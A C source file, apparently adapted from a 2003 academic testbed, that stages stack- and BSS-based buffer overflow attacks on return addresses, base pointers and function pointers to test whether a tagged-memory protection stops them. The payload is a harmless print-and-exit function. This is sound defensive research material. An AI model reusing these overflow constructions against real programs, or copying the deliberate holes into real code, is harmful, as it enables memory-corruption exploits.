/*
 * Dynamic testbed for twenty buffer overflow attack forms
 *
 * Published at Network & Distributed System Security Symposium 2003:
 * "A Comparison of Publicly Available Tools for Dynamic Buffer
 * Overflow Prevention"
 *
 * Copyright 2003 John Wilander
 * Dept. of Computer Science, Linkoping University, Sweden
 * johwi@ida.liu.se
 * http://www.ida.liu.se/~johwi
 *
 * This is a slightly old version of the source code where only 18
 * of the 20 attack forms are implemented. Missing are:
 * Buffer overflow of pointer on heap/BSS and then pointing to
 *   - Target: Parameter function pointer
 *   - Target: Parameter longjmp buffer
 * I should be pretty easy to re-implement these cases.
 *
 * CONDITIONS OF USAGE: If you use this code for analysis, testing,
 * development, implementation, or the like, in any public, published,
 * or commercial work you should refer to to our original NDSS'03
 * paper (see above) and give acknowledgement to the author of the
 * source code. This source code header must not be removed. Apart
 * from that you can use it freely! The author takes no responsibility
 * for how you use it. Good luck!
 */

#include <stdio.h>
#include <stdlib.h>
#include <setjmp.h>
#include <string.h>

#define BUFSIZE 16
#define OVERFLOWSIZE 256

int base_pointer_offset;
long overflow_buffer[OVERFLOWSIZE];

/*****************************************************************/
/*                       Shellcode                               */
/*****************************************************************/

void shellcode(){
  printf("Shellcode!\n");
  exit(0);
}

/*****************************************************************/
/*              Stack-based buffer overflow attacks              */
/*****************************************************************/

void parameter_func_pointer(int choice, void (*stack_function_pointer)()) {
  long *stack_pointer;
  long stack_buffer[BUFSIZE];
  char propolice_dummy[10];
  int overflow;

  /* Just a dummy pointer setup */
  stack_pointer = &stack_buffer[1];

  /* Store in i the address of the stack frame section dedicated to function arguments */
  register int i asm("x8");

  if ((choice == -4) &&
      ((long)i > (long)&propolice_dummy)) {
    /* First set up overflow_buffer with 'A's and a
       new function pointer pointing to the shellcode */
    overflow = (int)((long)(i+28) - (long)&stack_buffer);
    memset(overflow_buffer, 'A', overflow);
    overflow_buffer[overflow/4] = (long)&shellcode;

    /* TAG INITIALIZATION */
    for(int j=0; j<=overflow/4; j++) {
      asm volatile ("p.spsw x0, 0(%[ovf]);"                
                    :
                    :[ovf] "r" (overflow_buffer+j));
    }

    /* Then overflow stack_buffer with overflow_buffer  */
    memcpy(stack_buffer, overflow_buffer, overflow+4);

    /* Function call using the function pointer */
    (void)(*stack_function_pointer)();
  }
  else if ((choice == -2) &&
	   ((long)&stack_pointer > (long)&propolice_dummy)) {
    /* First set up overflow_buffer with the address of the
       shellcode, a few 'A's and a pointer to the function pointer */
    overflow = (int)((long)&stack_pointer - (long)&stack_buffer) + 4;
    overflow_buffer[0] = (long)&shellcode;
    memset(overflow_buffer+1, 'A', overflow-8);
    overflow_buffer[overflow/4-1] = (long)(&stack_function_pointer);

    /* TAG INITIALIZATION */
    for(int j=0; j<overflow/4; j++) {
      asm volatile ("p.spsw x0, 0(%[ovf]);"                
                    :
                    :[ovf] "r" (overflow_buffer+j));
    }

    /* Then overflow stack_buffer with overflow_buffer */
    memcpy(stack_buffer, overflow_buffer, overflow);

    /* Overwritten data from stack_buffer is copied to where
       the stack_pointer is pointing */
    *stack_pointer = stack_buffer[0];

    /* Function call using the function pointer */
    (void)(*stack_function_pointer)();
  }
  return;
}

void vuln_parameter_function_ptr(int choice) {
  void (*stack_function_pointer)(void);

  parameter_func_pointer(choice, stack_function_pointer);
  return;
}

/*****************************************************************/

void vuln_stack_return_addr(int choice) { /* Attack forms 1(a) and 3(a) */
  long *stack_pointer;
  long stack_buffer[BUFSIZE];
  char propolice_dummy[10];
  int overflow;

  /* Just a dummy pointer setup */
  stack_pointer = &stack_buffer[1];

  /* Store in i the address of the stack frame section dedicated to function arguments */
  register int i asm("x8");  

  if ((choice == 1) &&
	   ((long)i > (long)&propolice_dummy)) {
    /* First set up overflow_buffer with 'A's and a new return address */
    overflow = (int)((long)i - (long)&stack_buffer);
    memset(overflow_buffer, 'A', overflow-4);
    overflow_buffer[overflow/4-1] = (long)&shellcode;

    /* TAG INITIALIZATION */
    for(int j=0; j<overflow/4; j++) {
      asm volatile ("p.spsw x0, 0(%[ovf]);"                
                    :
                    :[ovf] "r" (overflow_buffer+j));
    }

    /* Then overflow stack_buffer with overflow_buffer */
    memcpy(stack_buffer, overflow_buffer, overflow); 
  }
  else if ((choice == 7) &&
	   ((long)&stack_pointer > (long)&propolice_dummy)) {
    /* First set up overflow_buffer with the address of the
       shellcode, a few 'A's and a pointer to the return address */
    overflow = (int)((long)&stack_pointer - (long)&stack_buffer) + 4;
    overflow_buffer[0] = (long)&shellcode;
    memset(overflow_buffer+1, 'A', overflow-8);
    overflow_buffer[overflow/4-1] = (long)(i-4);

    /* TAG INITIALIZATION */
    for(int j=0; j<overflow/4; j++) {
      asm volatile ("p.spsw x0, 0(%[ovf]);"                
                    :
                    :[ovf] "r" (overflow_buffer+j));
    }

    /* Then overflow stack_buffer with overflow_buffer */
    memcpy(stack_buffer, overflow_buffer, overflow);

    /* Overwritten data from stack_buffer is copied to where
       the stack_pointer is pointing */
    *stack_pointer = stack_buffer[0];
  }
  else printf("Attack form not possible\n");
  return;
}

/*****************************************************************/

void vuln_stack_base_ptr(int choice) { /* Attack forms 1(b) and 3(b) */
  long *stack_pointer;
  long stack_buffer[BUFSIZE];
  char propolice_dummy[10];
  int overflow;

  /* Just a dummy pointer setup */
  stack_pointer = &stack_buffer[1];

  /* Store in i the address of the stack frame section dedicated to function arguments */
  register int i asm("x8"); 

  if ((choice == 2) &&
      ((long)i > (long)&propolice_dummy)) {
    /* First set up overflow_buffer with a fake stack frame
       consisting of a base pointer and a return address
       pointing to the shellcode, a few 'A's and a new 
       base pointer pointing back at the fake stack frame */
    overflow = (int)((long)i - (long)&stack_buffer)-base_pointer_offset;
    /* Copy base pointer */
    overflow_buffer[0] = (long)(i-4-(base_pointer_offset/4)*4);
    /* Fake return address */
    overflow_buffer[1] = (long)&shellcode;
    memset(overflow_buffer+2, 'A', overflow-4);
    overflow_buffer[overflow/4-1] = (long)&stack_buffer[0];

    /* TAG INITIALIZATION */
    for(int j=0; j<overflow/4; j++) {
      asm volatile ("p.spsw x0, 0(%[ovf]);"                
                    :
                    :[ovf] "r" (overflow_buffer+j));
    }

    /* Then overflow stack_buffer with overflow_buffer */
    memcpy(stack_buffer, overflow_buffer, overflow);
  }

  else if ((choice == 8) &&
	   ((long)&stack_pointer > (long)&propolice_dummy)) {
    /* First set up overflow_buffer with a fake stack frame
       consisting of a base pointer and a return address
       pointing to the shellcode, a few 'A's and a pointer
       to the old base pointer */
    overflow = (int)((long)&stack_pointer - (long)&stack_buffer) + 4;
    overflow_buffer[0] = (long)&stack_buffer[1];
    /* Copy base pointer */
    overflow_buffer[1] = (long)(&choice-1-(base_pointer_offset/4));
    /* Fake return address */
    overflow_buffer[2] = (long)&shellcode;
    memset(overflow_buffer+3, 'A', overflow-4*(3+1));
    /* Old base pointer */
    overflow_buffer[overflow/4-1] = (long)(&choice-1-(base_pointer_offset/4));

    /* TAG INITIALIZATION */
    for(int j=0; j<overflow/4; j++) {
      asm volatile ("p.spsw x0, 0(%[ovf]);"                
                    :
                    :[ovf] "r" (overflow_buffer+j));
    }

    /* Then overflow stack_buffer with overflow_buffer  */
    /* Now stack_pointer points to the old base pointer */
    memcpy(stack_buffer, overflow_buffer, overflow);

    /* Overwritten data from stack_buffer is copied to where
       the stack_pointer is pointing */
    *stack_pointer = stack_buffer[0];
  }
  else printf("Attack form not possible\n");
  return;
}

/*****************************************************************/

void vuln_stack_function_ptr(int choice) { /* Attack forms 1(c) and 3(c) */
  void (*stack_function_pointer)(void);
  long *stack_pointer;
  long stack_buffer[BUFSIZE];
  char propolice_dummy[10];
  int overflow;

  if ((choice == 3) &&
      ((long)&stack_function_pointer > (long)&propolice_dummy)) {
    /* First set up overflow_buffer with 'A's and a
       new function pointer pointing to the shellcode */
    overflow = (int)((long)&stack_function_pointer - (long)&stack_buffer);
    memset(overflow_buffer, 'A', overflow);
    overflow_buffer[overflow/4] = (long)&shellcode;

    /* TAG INITIALIZATION */
    for(int j=0; j<=overflow/4; j++) {
      asm volatile ("p.spsw x0, 0(%[ovf]);"                
                    :
                    :[ovf] "r" (overflow_buffer+j));
    }

    /* Then overflow stack_buffer with overflow_buffer  */
    memcpy(stack_buffer, overflow_buffer, overflow+4);

    /* Function call using the function pointer */
    (void)(*stack_function_pointer)();
  }

  else if ((choice == 9) &&
	   ((long)&stack_pointer > (long)&propolice_dummy)) {
    /* First set up overflow_buffer with the address of the
       shellcode, a few 'A's and a pointer to the function pointer */
    overflow = (int)((long)&stack_pointer - (long)&stack_buffer) + 4;
    overflow_buffer[0] = (long)&shellcode;
    memset(overflow_buffer+1, 'A', overflow-8);
    overflow_buffer[overflow/4-1] = (long)(&stack_function_pointer);

    /* TAG INITIALIZATION */
    for(int j=0; j<overflow/4; j++) {
      asm volatile ("p.spsw x0, 0(%[ovf]);"                
                    :
                    :[ovf] "r" (overflow_buffer+j));
    }

    /* Then overflow stack_buffer with overflow_buffer */
    memcpy(stack_buffer, overflow_buffer, overflow);

    /* Overwritten data from stack_buffer is copied to where
       the stack_pointer is pointing */
    *stack_pointer = stack_buffer[0];

    /* Function call using the function pointer */
    (void)(*stack_function_pointer)();
  }
  else printf("Attack form not possible\n");
  return;
}

/*****************************************************************/
/*               BSS-based buffer overflow attacks               */
/*****************************************************************/

void vuln_bss_return_addr(int choice) { /* Attack form 4(a)*/
  static char propolice_dummy_2[10];
  static long bss_buffer[BUFSIZE];
  static long *bss_pointer;
  char propolice_dummy_1[10];
  int overflow;

  /* Store in i the address of the stack frame section dedicated to function arguments */
  register int i asm("x8");  

  if ((choice == 11) &&
	   ((long)&bss_pointer > (long)&propolice_dummy_2)) {
    /* First set up overflow_buffer with the address of the
       shellcode, a few 'A's and a pointer to the return address */
    overflow = (int)((long)&bss_pointer - (long)&bss_buffer) + 4;
    overflow_buffer[0] = (long)&shellcode;
    memset(overflow_buffer+1, 'A', overflow-8);
    overflow_buffer[overflow/4-1] = (long)(i-4);

    /* TAG INITIALIZATION */
    for(int j=0; j<overflow/4; j++) {
      asm volatile ("p.spsw x0, 0(%[ovf]);"                
                    :
                    :[ovf] "r" (overflow_buffer+j));
    }

    /* Then overflow bss_buffer with overflow_buffer */
    memcpy(bss_buffer, overflow_buffer, overflow);

    /* Overwritten data from bss_buffer is copied to where
       the bss_pointer is pointing */
    *bss_pointer = bss_buffer[0];
  }
  else printf("Attack form not possible\n");
  return;
}

/*****************************************************************/

void vuln_bss_base_ptr(int choice) { /* Attack form 4(b)*/
  static char propolice_dummy_2[10];
  static long bss_buffer[BUFSIZE];
  static long *bss_pointer;
  char propolice_dummy_1[10];
  int overflow;

  /* Store in i the address of the stack frame section dedicated to function arguments */
  register int i asm("x8"); 

  if ((choice == 12) &&
	   ((long)&bss_pointer > (long)&propolice_dummy_2)) {
    /* First set up overflow_buffer with a fake stack frame
       consisting of a base pointer and a return address
       pointing to the shellcode, a few 'A's and a pointer
       to the old base pointer */
    overflow = (int)((long)&bss_pointer - (long)&bss_buffer) + 4;
    overflow_buffer[0] = (long)&bss_buffer[1];
    /* Copy base pointer */
    overflow_buffer[1] = (long)(i-4-(base_pointer_offset/4)*4);
    /* Fake return address */
    overflow_buffer[2] = (long)&shellcode;
    memset(overflow_buffer+3, 'A', overflow-4*(3+1));
    /* Old base pointer */
    overflow_buffer[overflow/4-1] = (long)(i-4-(base_pointer_offset/4)*4);

    /* TAG INITIALIZATION */
    for(int j=0; j<overflow/4; j++) {
      asm volatile ("p.spsw x0, 0(%[ovf]);"                
                    :
                    :[ovf] "r" (overflow_buffer+j));
    }

    /* Then overflow bss_buffer with overflow_buffer  */
    /* Now bss_pointer points to the old base pointer */
    memcpy(bss_buffer, overflow_buffer, overflow);

    /* Overwritten data from bss_buffer is copied to where
       the bss_pointer is pointing */
    *bss_pointer = bss_buffer[0];
  }
  else printf("Attack form not possible\n");
  return;
}

/*****************************************************************/

void vuln_bss_function_ptr(int choice) { /* Attack forms 2(a) and 4(c) */
  static char propolice_dummy_2[10];
  static long bss_buffer[BUFSIZE];
  static long *bss_pointer;
  static void (*bss_function_pointer)(void);
  char propolice_dummy_1[10];
  int overflow;

  if ((choice == 5) &&
      ((long)&bss_function_pointer > (long)&propolice_dummy_2)) {
    /* First set up overflow_buffer with 'A's and a
       new function pointer pointing to the shellcode */
    overflow = (int)((long)&bss_function_pointer - (long)&bss_buffer);
    memset(overflow_buffer, 'A', overflow);
    overflow_buffer[overflow/4] = (long)&shellcode;

    /* TAG INITIALIZATION */
    for(int j=0; j<=overflow/4; j++) {
      asm volatile ("p.spsw x0, 0(%[ovf]);"                
                    :
                    :[ovf] "r" (overflow_buffer+j));
    }

    /* Then overflow bss_buffer with overflow_buffer  */
    memcpy(bss_buffer, overflow_buffer, overflow+4);

    /* Function call using the function pointer */
    (void)(*bss_function_pointer)();
  }

  else if ((choice == 13) &&
	   ((long)&bss_pointer > (long)&propolice_dummy_2)) {
    /* First set up overflow_buffer with the address of the
       shellcode, a few 'A's and a pointer to the function pointer */
    overflow = (int)((long)&bss_pointer - (long)&bss_buffer) + 4;
    overflow_buffer[0] = (long)&shellcode;
    memset(overflow_buffer+1, 'A', overflow-8);
    overflow_buffer[overflow/4-1] = (long)(&bss_function_pointer);

    /* TAG INITIALIZATION */
    for(int j=0; j<overflow/4; j++) {
      asm volatile ("p.spsw x0, 0(%[ovf]);"                
                    :
                    :[ovf] "r" (overflow_buffer+j));
    }

    /* Then overflow bss_buffer with overflow_buffer */
    memcpy(bss_buffer, overflow_buffer, overflow);

    /* Overwritten data from bss_buffer is copied to where
       the bss_pointer is pointing */
    *bss_pointer = bss_buffer[0];

    /* Function call using the function pointer */
    (void)(*bss_function_pointer)();
  }
  else printf("Attack form not possible\n");
  return;
}

/*****************************************************************/
/*                          main()                               */
/*****************************************************************/

int main (int argc, char **argv) {
  int choice;
  
  base_pointer_offset = 4;

  choice = 1;

  switch(choice) {
  case -4:
    vuln_parameter_function_ptr(choice);
    printf("Attack prevented.\n");
    break;
  case -2:
    vuln_parameter_function_ptr(choice);
    printf("Attack prevented.\n");
    break;
  case 1:
    vuln_stack_return_addr(choice);
    printf("Attack prevented.\n");
    break;
  case 2:
    vuln_stack_base_ptr(choice);
    //printf("Attack prevented.\n");
    break;
  case 3:
    vuln_stack_function_ptr(choice);
    printf("Attack prevented.\n");
    break;
  case 5:
    vuln_bss_function_ptr(choice);
    printf("Attack prevented.\n");
    break;
  case 7:
    vuln_stack_return_addr(choice);
    printf("Attack prevented.\n");
    break;
  case 8:
    vuln_stack_base_ptr(choice);
    //printf("Attack prevented.\n");
    break;
  case 9:
    vuln_stack_function_ptr(choice);
    printf("Attack prevented.\n");
    break;
  case 11:
    vuln_bss_return_addr(choice);
    printf("Attack prevented.\n");
    break;
  case 12:
    vuln_bss_base_ptr(choice);
    //printf("Attack prevented.\n");
    break;
  case 13:
    vuln_bss_function_ptr(choice);
    printf("Attack prevented.\n");
    break;
  default:
    break; }
  return 0;
}
